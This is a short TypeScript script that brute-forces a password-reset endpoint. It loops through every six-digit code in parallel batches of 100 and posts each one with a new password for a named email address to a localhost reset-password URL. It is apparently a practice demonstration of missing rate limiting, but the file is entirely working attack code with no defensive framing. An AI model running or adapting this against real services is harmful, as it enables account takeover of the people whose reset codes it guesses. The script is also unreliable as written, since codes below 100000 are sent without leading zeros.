import axios from 'axios'
async function sendRequest(otp:string){
    console.log("I am trying bruh",otp)
let data = JSON.stringify({
  "email": "aryann@gmail.com",
  "otp": otp,
  "newPassword": "string"
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'http://localhost:3000/reset-password',
  headers: { 
    'Content-Type': 'application/json'
  },
  data : data
};
try{
await axios.request(config);
}
catch(e){
//console.log(e);
}
}

async function main(){

for(let i=0;i<=999999;i+=100){
    const p=[]
   for(let j=0;j<100;j++){
    console.log(i+j);
        p.push(sendRequest((i+j).toString()))
   }
   await Promise.all(p);
   
}
}

main();